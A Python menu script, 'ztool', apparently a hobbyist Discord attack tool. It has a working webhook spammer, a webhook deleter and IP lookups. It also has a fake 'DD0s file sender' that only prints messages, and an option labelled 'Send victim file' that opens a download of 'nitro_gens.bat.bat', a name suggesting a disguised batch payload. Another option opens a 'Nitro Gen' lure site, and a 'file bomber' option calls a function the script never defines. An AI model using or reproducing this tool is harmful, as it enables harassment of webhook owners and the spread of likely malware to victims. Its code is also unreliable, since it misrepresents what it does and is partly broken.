import requests
import os
import time

def main_menu():
    while True:
        os.system('clear')
        print("==============================")
        print("            ztool              ")
        print("==============================")
        print("1. Send Discord Webhook Message")
        print("2. Delete Discord Webhook")
        print("3. IP Address Lookup")
        print("4. What's My IP?")
        print("5. DD0s file sender")
        print("6. Send victim file. Spamming apps")
        print("7. Open Nitro Gen")
        print("8. Color Switch for GUI")
        print("9. File bomber install and send to victim!!!")
        print("0. Exit")
        print("==============================")
        
        choice = input("Please choose an option (0-9): ")
        
        if choice == "1":
            webhook_spammer()
        elif choice == "2":
            webhook_deleter()
        elif choice == "3":
            ip_lookup()
        elif choice == "4":
            what_is_my_ip()
        elif choice == "5":
            file_sender()
        elif choice == "6":
            open_link()
        elif choice == "7":
            open_nitro_gen()
        elif choice == "8":
            color_switch()
        elif choice == "9":
            install_file()
        elif choice == "0":
            exit()
        else:
            print("Invalid option! Please choose again.")
            input("Press Enter to continue...")

def webhook_spammer():
    os.system('clear')
    print("==============================")
    print("        Discord Webhook Spammer")
    print("==============================")
    webhook_url = input("Enter Discord webhook URL: ").strip()
    message = input("Enter message to spam: ")
    while True:
        try:
            message_count = int(input("Enter number of messages to send: "))
            break
        except ValueError:
            print("Please enter a valid number.")

    print(f"Spamming Discord webhook {webhook_url} with {message_count} messages...")
    try:
        for i in range(message_count):
            print(f"Sending message {i + 1}...")
            response = requests.post(webhook_url, json={"content": message})
            response.raise_for_status()  # Raise error for non-2xx responses
            time.sleep(0.5)  # Add a delay to avoid rate limits (adjust as needed)
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")
    
    print("Webhook spam complete.")
    input("Press Enter to continue...")

def webhook_deleter():
    os.system('clear')
    print("==============================")
    print("        Delete Discord Webhook")
    print("==============================")
    webhook_url = input("Enter Discord webhook URL to delete: ").strip()

    print(f"Deleting Discord webhook {webhook_url}...")
    try:
        response = requests.delete(webhook_url)
        response.raise_for_status()
        print("Webhook deleted successfully.")
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")
    
    input("Press Enter to continue...")

def ip_lookup():
    os.system('clear')
    print("==============================")
    print("        IP Address Lookup")
    print("==============================")
    ip_address = input("Enter IP address to lookup: ").strip()

    print(f"Looking up information for IP address {ip_address}...")
    try:
        response = requests.get(f"https://ipinfo.io/{ip_address}/json")
        response.raise_for_status()
        data = response.json()
        print(f"IP Address: {data['ip']}")
        print(f"City: {data['city']}")
        print(f"Region: {data['region']}")
        print(f"Country: {data['country']}")
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")
    
    input("Press Enter to continue...")

def what_is_my_ip():
    os.system('clear')
    print("==============================")
    print("        What's My IP?")
    print("==============================")
    print("Retrieving your current IP address...")
    try:
        response = requests.get("https://ipinfo.io/ip")
        response.raise_for_status()
        print(f"Your IP address is: {response.text.strip()}")
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")
    
    input("Press Enter to continue...")

def file_sender():
    os.system('clear')
    print("==============================")
    print("        File Sender")
    print("==============================")
    ip = input("Enter IP address to send file to: ").strip()
    while True:
        try:
            num_gb = int(input("Enter number of gigabytes to send: "))
            if num_gb < 1:
                print("Input must be at least 1.")
                continue
            break
        except ValueError:
            print("Please enter a valid number.")

    for i in range(num_gb):
        print(f"Sending file: 1 GB to {ip} - Packet {i + 1}")
        time.sleep(2)
    
    print(f"File sent successfully to {ip}.")
    input("Press Enter to continue...")

def open_link():
    os.system('clear')
    print("==============================")
    print("        Open Link")
    print("==============================")
    print("Opening link: https://www.mediafire.com/file/vq2259ec6q0tkow/nitro_gens.bat.bat/file")
    os.system('xdg-open https://www.mediafire.com/file/vq2259ec6q0tkow/nitro_gens.bat.bat/file')
    input("Press Enter to continue...")

def open_nitro_gen():
    os.system('clear')
    print("==============================")
    print("        Open Nitro Gen")
    print("==============================")
    print("Opening Nitro Gen: https://nitro-gen-nine.vercel.app/")
    os.system('xdg-open https://nitro-gen-nine.vercel.app/')
    input("Press Enter to continue...")

def color_switch():
    os.system('clear')
    print("==============================")
    print("        Color Switch for GUI")
    print("==============================")
    print("Choose a color for the GUI:")
    print("1. Red")
    print("2. Blue")
    print("3. Green")
    print("4. Turquoise")
    print("5. Magenta")
    print("6. Yellow")
    print("7. White")
    print("8. Grey")
    print("9. Light Blue")
    print("A. Light Green")
    print("B. Light Turquoise")
    print("C. Light Red")
    print("D. Light Magenta")
    print("E. Light Yellow")
    print("F. Light White")
    print("X. Rainbow Animation")
    print("==============================")
    
    color_choice = input("Enter color choice (1-9, A-F, X): ").upper()

    # ANSI escape sequences for colors
    colors = {
        '1': '\033[91m',   # Red
        '2': '\033[94m',   # Blue
        '3': '\033[92m',   # Green
        '4': '\033[96m',   # Turquoise
        '5': '\033[95m',   # Magenta
        '6': '\033[93m',   # Yellow
        '7': '\033[97m',   # White
        '8': '\033[90m',   # Grey
        '9': '\033[94m',   # Light Blue
        'A': '\033[92m',   # Light Green
        'B': '\033[96m',   # Light Turquoise
        'C': '\033[91m',   # Light Red
        'D': '\033[95m',   # Light Magenta
        'E': '\033[93m',   # Light Yellow
        'F': '\033[97m'    # Light White
    }

    reset_color = '\033[0m'  # Reset to default terminal color

    if color_choice in colors:
        print(f"{colors[color_choice]}Color changed to {color_choice}.{reset_color}")
    elif color_choice == 'X':
        rainbow_animation()
    else:
        print("Invalid color choice.")
    
    input("Press Enter to continue...")

def rainbow_animation():
    os.system('clear')
    print("==============================")
    print("        Rainbow Animation")
    print("==============================")
    print("Press Ctrl+C to stop the animation.")
    colors = ['\033[94m', '\033[92m', '\033[95m', '\033[35m', '\033[96m', '\033[93m', '\033[91m', '\033[97m']  # List of ANSI escape sequences for colors
    try:
        while True:
            for color in colors:
                print(f"{color}Colorful animation\033[0m", end='\r')
                time.sleep(1)  # Change color every 1 second
    except KeyboardInterrupt:
        print("\nAnimation stopped.")

if __name__ == "__main__":
    main_menu()
